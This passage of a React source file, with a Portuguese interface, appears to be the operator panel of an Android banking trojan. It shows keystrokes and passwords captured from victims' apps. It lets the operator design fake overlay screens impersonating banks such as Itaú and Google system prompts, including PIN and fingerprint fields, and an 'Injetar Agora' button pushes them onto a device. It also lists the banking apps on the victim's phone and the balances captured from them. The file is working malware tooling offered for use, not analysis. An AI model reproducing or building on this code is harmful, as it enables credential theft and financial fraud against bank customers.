                                {appKeylogs.length === 0 ? (
                                  <p className="text-[10px] text-[#8b8b94] italic py-1">Nenhum texto ou tecla gravada neste aplicativo até o momento.</p>
                                ) : (
                                  <div className="space-y-1 max-h-32 overflow-y-auto pr-1">
                                    {appKeylogs.slice(0, 10).map((k: any, kIdx: number) => (
                                      <div key={kIdx} className="bg-[#0a0a0b] p-1.5 rounded-md border border-[#2a2a31]/15 flex items-center justify-between text-[11px]">
                                        <span className="text-white font-bold break-all">{k.text || k.data || k.value}</span>
                                        <span className="text-[9px] text-slate-400 shrink-0 ml-2">{k.timestamp ? new Date(k.timestamp).toLocaleTimeString() : ''}</span>
                                      </div>
                                    ))}
                                  </div>
                                )}
                              </div>

                              {/* Senhas e Credenciais Capturadas para este App */}
                              {appPasswords.length > 0 && (
                                <div className="bg-[#121214]/30 rounded-md p-2.5 border border-[#2a2a31]/40 space-y-1.5">
                                  <div className="text-[11px] font-bold text-[#ef4444] flex items-center gap-1">
                                    <span> Senhas e Credenciais Capturadas ({appPasswords.length})</span>
                                  </div>
                                  <div className="space-y-1 max-h-28 overflow-y-auto pr-1">
                                    {appPasswords.map((p: any, pIdx: number) => (
                                      <div key={pIdx} className="bg-[#110505] p-1.5 rounded-md border border-[#2a2a31]/30 flex items-center justify-between text-[11px]">
                                        <span className="text-[#ef4444] font-mono font-bold">{p.password || p.data || p.pin}</span>
                                        <span className="text-[9px] text-slate-400">{p.created_at ? new Date(p.created_at).toLocaleTimeString() : ''}</span>
                                      </div>
                                    ))}
                                  </div>
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      );
                    })
                  )}
                </div>
              </div>
            ) : showEditBankScreensTab ? (
              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                {/* Lateral Esquerda - Selector de Bancos e Form de Edição */}
                <div className="w-full md:w-1/2 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                       Editar Telas de Banco
                    </span>
                  </div>
                  
                  <div className="flex-1 overflow-y-auto p-4 space-y-4">
                    {/* Selector de Presets */}
                    <div>
                      <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Selecione o Banco</label>
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                        {bankScreens.map(screen => {
                          const isSelected = selectedPresetScreenId === screen.id;
                          return (
                            <button
                              key={screen.id}
                              onClick={() => selectPreset(screen.id)}
                              className={`py-2 px-3 rounded-md border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
                                isSelected
                                  ? 'bg-gradient-to-r from-[#65a30d]/30 to-[#84cc16]/10 border-pink-500/80 text-white shadow-[0_0_10px_rgba(236,72,153,0.15)] text-center'
                                  : 'bg-[#121214]/60 border-[#24242a] text-slate-400 hover:text-white hover:bg-[#24242a]/40 text-center'
                              }`}
                            >
                              {screen.name.split('-')[0].trim()}
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    <div className="border-t border-[#24242a] my-2"></div>

                    {/* Inputs de customização */}
                    <div className="space-y-3">
                      <div>
                        <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Pacote Alvo (Gatilho)</label>
                        <input
                          type="text"
                          value={editBankPackage}
                          onChange={(e) => setEditBankPackage(e.target.value)}
                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                          placeholder="Ex: br.com.itau"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Texto do Logo</label>
                          <input
                            type="text"
                            value={editBankLogoText}
                            onChange={(e) => {
                              setEditBankLogoText(e.target.value);
                              handleUpdateCurrentScreenProperty('logo', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Título da Ação</label>
                          <input
                            type="text"
                            value={editBankTitle}
                            onChange={(e) => {
                              setEditBankTitle(e.target.value);
                              handleUpdateCurrentScreenProperty('title', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                      </div>
                      <div>
                        <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Descrição</label>
                        <textarea
                          value={editBankDesc}
                          onChange={(e) => {
                            setEditBankDesc(e.target.value);
                            handleUpdateCurrentScreenProperty('desc', e.target.value);
                          }}
                          rows={2}
                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 resize-none"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Placeholder do Campo</label>
                          <input
                            type="text"
                            value={editBankPlaceholder}
                            onChange={(e) => {
                              setEditBankPlaceholder(e.target.value);
                              handleUpdateCurrentScreenProperty('placeholder', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Texto do Botão</label>
                          <input
                            type="text"
                            value={editBankButtonText}
                            onChange={(e) => {
                              setEditBankButtonText(e.target.value);
                              handleUpdateCurrentScreenProperty('buttonText', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                      </div>
                      {selectedPresetScreenId.includes('itau') && (
                        <div className="bg-orange-950/40 border border-[#ef4444]/50 rounded-md p-2.5 my-2">
                          <label className="block text-[11px] font-bold text-[#f87171] uppercase tracking-wider mb-1 flex items-center gap-1">
                            <span></span> Quantidade de Dígitos (Bolinhas):
                          </label>
                          <select
                            value={editBankDigitsOption}
                            onChange={(e) => handleUpdateItauDigits(e.target.value)}
                            className="w-full bg-slate-950/90 border border-[#ef4444]/60 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-[#f87171] font-mono font-bold"
                          >
                            <option value="6,4">6 Dígitos (Acesso) + 4 Dígitos (Transação) [Padrão Itaú]</option>
                            <option value="4,4">4 Dígitos em Ambos os Passos (4 Bolinhas)</option>
                            <option value="6,6">6 Dígitos em Ambos os Passos (6 Bolinhas)</option>
                            <option value="4,6">4 Dígitos (Acesso) + 6 Dígitos (Transação)</option>
                          </select>
                        </div>
                      )}

                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Fundo (Cor/Gradient)</label>
                          <input
                            type="text"
                            value={editBankBgColor}
                            onChange={(e) => {
                              setEditBankBgColor(e.target.value);
                              handleUpdateCurrentScreenProperty('bgColor', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Cor do Botão</label>
                          <div className="flex gap-1.5">
                            <input
                              type="color"
                              value={editBankBtnColor.startsWith('#') && editBankBtnColor.length === 7 ? editBankBtnColor : '#ef4444'}
                              onChange={(e) => {
                                setEditBankBtnColor(e.target.value);
                                handleUpdateCurrentScreenProperty('btnColor', e.target.value);
                              }}
                              className="w-8 h-8 p-0 border-0 bg-transparent rounded cursor-pointer flex-shrink-0"
                            />
                            <input
                              type="text"
                              value={editBankBtnColor}
                              onChange={(e) => {
                                setEditBankBtnColor(e.target.value);
                                handleUpdateCurrentScreenProperty('btnColor', e.target.value);
                              }}
                              className="w-full bg-slate-950/80 border border-[#24242a] rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="flex gap-2 pt-3 border-t border-[#24242a] flex-shrink-0">
                      <button
                        onClick={() => setShowBankVisualEditor(true)}
                        className="flex-1 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.25)] flex items-center justify-center gap-1"
                      >
                         Editor Visual
                      </button>
                      <button
                        onClick={() => {
                          const compiled = getCompiledBankTemplate();
                          if (compiled) applyCustomBlackScreen(compiled, editBankPackage);
                        }}
                        className="flex-1 py-2.5 bg-gradient-to-r from-[#65a30d] to-[#ef4444] hover:from-pink-500 hover:to-rose-400 text-white font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(236,72,153,0.3)] flex items-center justify-center gap-1"
                      >
                         Injetar Agora
                      </button>
                      <button
                        onClick={saveCustomBankMapping}
                        className="flex-1 py-2.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-200 border border-[#2a2a31] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
                      >
                         Salvar Gatilho
                      </button>
                    </div>
                  </div>
                </div>

                {/* Lateral Direita - Live Preview */}
                <div className="flex-1 flex flex-col items-center justify-center bg-[#200603] p-4 overflow-hidden relative">
                  <div className="absolute top-3 left-4 text-[10px] text-[#8b8b94] font-mono">LIVE PREVIEW</div>
                  
                  {/* Celular Mockup */}
                  <div className="w-[280px] h-[520px] rounded-[36px] border-[8px] border-[#24242a] bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
                       style={{ background: editBankBgColor }}>
                    
                    {/* Speaker Notch */}
                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-[#121214] rounded-full z-20 flex items-center justify-center">
                      <div className="w-10 h-1 bg-[#24242a] rounded-full"></div>
                    </div>

                    {/* Conteúdo Renderizado Dinamicamente */}
                    {(() => {
                      const screen = bankScreens.find(s => s.id === selectedPresetScreenId);
                      if (!screen) return null;
                      
                      return (
                        <div className="flex-1 relative w-full h-full p-4 flex flex-col justify-between">
                          <div className="w-full h-full relative">
                            {screen.elements.map((el: any) => {
                              // Escalar do tamanho do Android (360x780) para o tamanho do mockup (264x504)
                              const mockupWidth = 264;
                              const mockupHeight = 504;
                              const scaleX = mockupWidth / 360;
                              const scaleY = mockupHeight / 780;
                              
                              return (
                                <div
                                  key={el.id}
                                  className="absolute select-none pointer-events-none"
                                  style={{
                                    left: el.x * scaleX,
                                    top: el.y * scaleY,
                                    width: el.width * scaleX,
                                    height: el.height * scaleY,
                                    opacity: (el.opacity || 100) / 100
                                  }}
                                >
                                  {el.type === 'text' && (
                                    <div
                                      style={{
                                        color: el.color,
                                        fontSize: `${(el.fontSize || 16) * scaleX}px`,
                                        fontWeight: el.fontWeight,
                                        textAlign: el.textAlign || 'center',
                                        width: '100%',
                                        height: '100%',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        wordBreak: 'break-word'
                                      }}
                                    >
                                      {el.content}
                                    </div>
                                  )}
                                  {el.type === 'logo' && (
                                    <div
                                      style={{
                                        color: el.color || '#ffffff',
                                        fontSize: `${(el.fontSize || 22) * scaleX}px`,
                                        fontWeight: 'bold',
                                        textAlign: 'center',
                                        width: '100%',
                                        height: '100%',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        textTransform: 'lowercase'
                                      }}
                                    >
                                      {el.content}
                                    </div>
                                  )}
                                  {el.type === 'input' && (
                                    <div
                                      className="w-full h-full flex flex-col justify-center px-3 border"
                                      style={{
                                        backgroundColor: el.backgroundColor || 'rgba(22, 6, 6, 0.6)',
                                        borderColor: el.borderColor || '#ec7000',
                                        borderRadius: `${(el.borderRadius || 12) * scaleX}px`,
                                        color: el.color || '#ffffff',
                                        fontSize: `${11 * scaleX}px`
                                      }}
                                    >
                                      <span className="text-gray-400 truncate">
                                        {el.placeholder || 'Campo de entrada'}
                                      </span>
                                    </div>
                                  )}
                                  {el.type === 'button' && (
                                    <div
                                      className="w-full h-full flex items-center justify-center font-bold font-sans shadow-md text-center"
                                      style={{
                                        backgroundColor: el.backgroundColor || '#ec7000',
                                        color: el.color || '#ffffff',
                                        borderRadius: `${(el.borderRadius || 12) * scaleX}px`,
                                        fontSize: `${12 * scaleX}px`
                                      }}
                                    >
                                      {el.content || 'Confirmar'}
                                    </div>
                                  )}
                                  {el.type === 'image' && (
                                    <div className="w-full h-full flex items-center justify-center overflow-hidden">
                                      {el.imageUrl ? (
                                        <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                                      ) : (
                                        <span className="text-lg"></span>
                                      )}
                                    </div>
                                  )}
                                  {(el.type === 'rectangle' || el.type === 'circle') && (
                                    <div
                                      className="w-full h-full"
                                      style={{
                                        backgroundColor: el.backgroundColor,
                                        borderRadius: el.type === 'circle' ? '50%' : `${(el.borderRadius || 0) * scaleX}px`
                                      }}
                                    />
                                  )}
                                  {el.type === 'fingerprint' && (
                                    <div className="w-full h-full flex flex-col items-center justify-center p-1 border border-dashed border-[#2a2a31]/20 rounded bg-[#121214]/10">
                                      <div
                                        className="rounded-full p-2 border animate-pulse"
                                        style={{ borderColor: el.biometricColor || '#00ff00' }}
                                      >
                                        <span style={{ color: el.biometricColor || '#00ff00', fontSize: `${14 * scaleX}px` }}></span>
                                      </div>
                                    </div>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                </div>
              </div>
            ) : showEditSystemScreensTab ? (
              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                {/* Lateral Esquerda - Selector de Telas e Form de Edição */}
                <div className="w-full md:w-1/2 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                       Telas de Sistema (Google/Outros)
                    </span>
                  </div>
                  
                  <div className="flex-1 overflow-y-auto p-4 space-y-4">
                    {/* Selector de Presets */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider">Selecione o Preset</label>
                        <button
                          type="button"
                          onClick={() => {
                            setSystemScreens(PRESET_SYSTEM_PROJECT.screens);
                            localStorage.removeItem('customPresetSystemScreens');
                            if (PRESET_SYSTEM_PROJECT.screens.length > 0) {
                              selectSystemPreset(PRESET_SYSTEM_PROJECT.screens[0].id);
                            }
                            addLog(' Presets do sistema restaurados para o padrão!');
                          }}
                          className="text-[9px] font-mono text-teal-400 hover:text-teal-300 bg-teal-950/40 hover:bg-teal-900/40 px-2 py-0.5 rounded border border-teal-500/30 transition-all"
                        >
                           Restaurar Presets
                        </button>
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        {systemScreens.map(screen => {
                          const isSelected = selectedSystemScreenId === screen.id;
                          return (
                            <button
                              key={screen.id}
                              onClick={() => selectSystemPreset(screen.id)}
                              className={`py-2 px-3 rounded-md border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
                                isSelected
                                  ? 'bg-gradient-to-r from-teal-600/30 to-emerald-600/10 border-teal-500/80 text-white shadow-[0_0_10px_rgba(239,68,68,0.15)] text-center'
                                  : 'bg-[#121214]/60 border-[#24242a] text-slate-400 hover:text-white hover:bg-[#24242a]/40 text-center'
                              }`}
                            >
                              {screen.name.split('-')[0].trim()}
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    <div className="border-t border-[#24242a] my-2"></div>

                    {/* Inputs de customização */}
                    <div className="space-y-3">
                      <div>
                        <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Pacote Alvo (Gatilho)</label>
                        <input
                          type="text"
                          value={editSystemPackage}
                          onChange={(e) => setEditSystemPackage(e.target.value)}
                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
                          placeholder="Ex: com.google.android.gms"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Texto do Logo</label>
                          <input
                            type="text"
                            value={editSystemLogoText}
                            onChange={(e) => {
                              setEditSystemLogoText(e.target.value);
                              handleUpdateSystemScreenProperty('logo', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Título da Ação</label>
                          <input
                            type="text"
                            value={editSystemTitle}
                            onChange={(e) => {
                              setEditSystemTitle(e.target.value);
                              handleUpdateSystemScreenProperty('title', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                          />
                        </div>
                      </div>
                      <div>
                        <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Descrição</label>
                        <textarea
                          value={editSystemDesc}
                          onChange={(e) => {
                            setEditSystemDesc(e.target.value);
                            handleUpdateSystemScreenProperty('desc', e.target.value);
                          }}
                          rows={2}
                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 resize-none"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Placeholder do Campo</label>
                          <input
                            type="text"
                            value={editSystemPlaceholder}
                            onChange={(e) => {
                              setEditSystemPlaceholder(e.target.value);
                              handleUpdateSystemScreenProperty('placeholder', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Texto do Botão</label>
                          <input
                            type="text"
                            value={editSystemButtonText}
                            onChange={(e) => {
                              setEditSystemButtonText(e.target.value);
                              handleUpdateSystemScreenProperty('buttonText', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                          />
                        </div>
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Fundo (Cor/Gradient)</label>
                          <input
                            type="text"
                            value={editSystemBgColor}
                            onChange={(e) => {
                              setEditSystemBgColor(e.target.value);
                              handleUpdateSystemScreenProperty('bgColor', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Cor do Botão</label>
                          <div className="flex gap-1.5">
                            <input
                              type="color"
                              value={editSystemBtnColor.startsWith('#') && editSystemBtnColor.length === 7 ? editSystemBtnColor : '#ff6b6b'}
                              onChange={(e) => {
                                setEditSystemBtnColor(e.target.value);
                                handleUpdateSystemScreenProperty('btnColor', e.target.value);
                              }}
                              className="w-8 h-8 p-0 border-0 bg-transparent rounded cursor-pointer flex-shrink-0"
                            />
                            <input
                              type="text"
                              value={editSystemBtnColor}
                              onChange={(e) => {
                                setEditSystemBtnColor(e.target.value);
                                handleUpdateSystemScreenProperty('btnColor', e.target.value);
                              }}
                              className="w-full bg-slate-950/80 border border-[#24242a] rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="bg-teal-950/20 border border-teal-500/30 rounded-md p-3 text-[11px] text-teal-400 font-sans flex items-start gap-2">
                      <span className="text-sm select-none"></span>
                      <div>
                        <strong>Onde as senhas são salvas:</strong> As informações capturadas por esta tela de sistema serão salvas na central <strong className="underline text-teal-300">Capturas Customizadas</strong> na barra de comandos à esquerda.
                      </div>
                    </div>

                    <div className="flex gap-2 pt-3 border-t border-[#24242a] flex-shrink-0">
                      <button
                        onClick={() => setShowSystemVisualEditor(true)}
                        className="flex-1 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.25)] flex items-center justify-center gap-1"
                      >
                         Editor Visual
                      </button>
                      <button
                        onClick={() => {
                          const compiled = getCompiledSystemTemplate();
                          if (compiled) applyCustomBlackScreen(compiled, editSystemPackage);
                        }}
                        className="flex-1 py-2.5 bg-gradient-to-r from-teal-600 to-emerald-500 hover:from-teal-500 hover:to-emerald-400 text-white font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center justify-center gap-1"
                      >
                         Injetar Agora
                      </button>
                      <button
                        onClick={saveCustomSystemMapping}
                        className="flex-1 py-2.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-200 border border-[#2a2a31] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
                      >
                         Salvar Gatilho
                      </button>
                    </div>
                  </div>
                </div>

                {/* Lateral Direita - Live Preview */}
                <div className="flex-1 flex flex-col items-center justify-center bg-[#200603] p-4 overflow-hidden relative h-full">
                  <div className="absolute top-3 left-4 text-[10px] text-[#8b8b94] font-mono">LIVE PREVIEW</div>
                  
                  {/* Celular Mockup */}
                  <div className="w-[280px] h-[500px] rounded-[36px] border-[8px] border-[#24242a] bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
                       style={{ background: editSystemBgColor }}>
                    
                    {/* Speaker Notch */}
                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-[#121214] rounded-full z-20 flex items-center justify-center">
                      <div className="w-10 h-1 bg-[#24242a] rounded-full"></div>
                    </div>

                    {/* Conteúdo Renderizado Dinamicamente */}
                    {(() => {
                      const screen = systemScreens.find(s => s.id === selectedSystemScreenId);
                      if (!screen) return null;
                      
                      return (
                        <div className="flex-1 relative w-full h-full p-4 flex flex-col justify-between">
                          <div className="w-full h-full relative">
                            {screen.elements.map((el: any) => {
                              // Escalar do tamanho do Android (360x780) para o tamanho do mockup (264x504)
                              const mockupWidth = 264;
                              const mockupHeight = 504;
                              const scaleX = mockupWidth / 360;
                              const scaleY = mockupHeight / 780;
                              
                              return (
                                <div
                                  key={el.id}
                                  className="absolute select-none pointer-events-none"
                                  style={{
                                    left: el.x * scaleX,
                                    top: el.y * scaleY,
                                    width: el.width * scaleX,
                                    height: el.height * scaleY,
                                    opacity: (el.opacity || 100) / 100
                                  }}
                                >
                                  {el.type === 'text' && (
                                    <div
                                      style={{
                                        color: el.color,
                                        fontSize: `${(el.fontSize || 16) * scaleX}px`,
                                        fontWeight: el.fontWeight,
                                        textAlign: el.textAlign || 'center',
                                        width: '100%',
                                        height: '100%',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        wordBreak: 'break-word'
                                      }}
                                    >
                                      {el.content}
                                    </div>
                                  )}
                                  {el.type === 'logo' && (
                                    <div
                                      style={{
                                        color: el.color || '#ffffff',
                                        fontSize: `${(el.fontSize || 22) * scaleX}px`,
                                        fontWeight: 'bold',
                                        textAlign: 'center',
                                        width: '100%',
                                        height: '100%',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center'
                                      }}
                                    >
                                      {el.content}
                                    </div>
                                  )}
                                  {el.type === 'input' && (
                                    <div
                                      className="w-full h-full flex flex-col justify-center px-3 border"
                                      style={{
                                        backgroundColor: el.backgroundColor || 'rgba(22, 6, 6, 0.6)',
                                        borderColor: el.borderColor || '#ff6b6b',
                                        borderRadius: `${(el.borderRadius || 12) * scaleX}px`,
                                        color: el.color || '#ffffff',
                                        fontSize: `${11 * scaleX}px`
                                      }}
                                    >
                                      <span className="text-gray-400 truncate">
                                        {el.placeholder || 'Campo de entrada'}
                                      </span>
                                    </div>
                                  )}
                                  {el.type === 'button' && (
                                    <div
                                      className="w-full h-full flex items-center justify-center font-bold font-sans shadow-md text-center"
                                      style={{
                                        backgroundColor: el.backgroundColor || '#ff6b6b',
                                        color: el.color || '#ffffff',
                                        borderRadius: `${(el.borderRadius || 12) * scaleX}px`,
                                        fontSize: `${12 * scaleX}px`
                                      }}
                                    >
                                      {el.content || 'Confirmar'}
                                    </div>
                                  )}
                                  {el.type === 'image' && (
                                    <div className="w-full h-full flex items-center justify-center overflow-hidden">
                                      {el.imageUrl ? (
                                        <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                                      ) : (
                                        <span className="text-lg"></span>
                                      )}
                                    </div>
                                  )}
                                  {(el.type === 'rectangle' || el.type === 'circle') && (
                                    <div
                                      className="w-full h-full"
                                      style={{
                                        backgroundColor: el.backgroundColor,
                                        borderRadius: el.type === 'circle' ? '50%' : `${(el.borderRadius || 0) * scaleX}px`
                                      }}
                                    />
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                </div>
              </div>
            ) : showBankMonitorTab ? (
              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                {/* Lateral Esquerda - Lista de Bancos Instalados */}
                <div className="w-full md:w-2/5 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                       Bancos no Aparelho
                    </span>
                    <button
                      onClick={fetchInstalledApps}
                      disabled={isLoadingApps}
                      className="px-2.5 py-1 text-[10px] bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/30 text-[#ef4444] font-bold rounded transition-all"
                    >
                      {isLoadingApps ? ' Buscando...' : ' Sincronizar'}
                    </button>
                  </div>
                  
                  <div className="flex-1 overflow-y-auto p-2 space-y-2">
                    {installedBanks.length === 0 ? (
                      <div className="text-center py-10 text-[#8b8b94] text-xs">
                        <span className="text-3xl block mb-2"></span>
                        Nenhum app de banco identificado. 
                        <br/>
                        Use o botão "Sincronizar" acima.
                      </div>
                    ) : (
                      installedBanks.map((app: any, idx: number) => {
                        const isAppOpen = screenHierarchy?.package === app.package || (device?.active_bank?.package === app.package);
                        const isSelected = selectedMonitorBank?.package === app.package;
                        const appBalanceObj = bankBalances.find((b: any) => b.package === app.package);
                        const lastAccessInfo = getAppLastAccess(app.package);
                        
                        return (
                          <div
                            key={idx}
                            onClick={() => setSelectedMonitorBank(app)}
                            className={`p-2.5 rounded-md border cursor-pointer transition-all duration-200 relative overflow-hidden group ${
                              isSelected 
                                ? 'bg-gradient-to-r from-[#121214]/80 via-[#380b04]/90 to-[#121214]/70 border-[#3a3a44]/80 shadow-[0_0_15px_rgba(239,68,68,0.2)]' 
                                : 'bg-[#240703]/80 hover:bg-[#3e0d05]/90 border-[#2a2a31]/15 hover:border-[#2a2a31]/40 shadow-sm'
                            }`}
                          >
                            {isSelected && (
                              <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-[#f87171] to-[#ef4444] shadow-[0_0_8px_#ef4444]" />
                            )}
                            <div className="flex items-center justify-between gap-2">
                              <div className="flex items-center space-x-3 min-w-0 flex-1">
                                <div className="relative flex-shrink-0">
                                  <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64 || app.icon_base64} name={app.name} size={36} />
                                  {isAppOpen && (
                                    <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500 border border-[#121214]" />
                                    </span>
                                  )}
                                </div>
                                <div className="min-w-0 flex-1">
                                  <h4 className="font-black text-xs text-white truncate group-hover:text-[#ef4444] transition-colors">{app.name}</h4>
                                  {appBalanceObj ? (
                                    <p className="text-[10px] text-emerald-400 font-bold font-mono truncate drop-shadow-[0_0_6px_rgba(52,211,153,0.3)]">{appBalanceObj.balance}</p>
                                  ) : (
                                    <p className="text-[9px] text-[#8b8b94] truncate font-mono">Sem saldo capturado</p>
                                  )}
                                </div>
                              </div>
                              
                              <div className="flex flex-col items-end justify-center space-y-1 ml-1 flex-shrink-0">
                                {isAppOpen ? (
                                  <span className="px-2 py-0.5 rounded-full text-[8px] font-black uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.3)] flex items-center gap-1">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                                     ABERTO
                                  </span>
                                ) : lastAccessInfo ? (
